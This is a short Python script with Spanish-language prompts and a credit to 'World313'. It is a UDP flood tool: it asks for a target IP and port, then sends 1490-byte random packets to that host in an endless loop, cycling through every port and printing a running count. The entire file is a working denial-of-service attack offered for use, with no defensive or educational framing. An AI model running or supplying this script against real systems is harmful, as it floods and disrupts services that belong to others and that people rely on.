#Code by World313
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

ip = input('\033[1;31m'+'IP del objetivo : '+'\033[0;31m')
port = int(input('\033[1;31m'+'Puerto : '+'\033[0;31m'))

sent = 0

while True:
    sock.sendto(bytes, (ip,port))
    sent += 1
    port += 1
    print('\033[0;32m'+'Se enviaron '+'\033[0;31m'+f'{sent}'+'\033[0;32m'+' a '+'\033[0;31m'+f'{ip}'+'\033[0;32m'+' por el puerto: '+'\033[0;31m'+f'{port}')
    if port == 65534:
        port = 1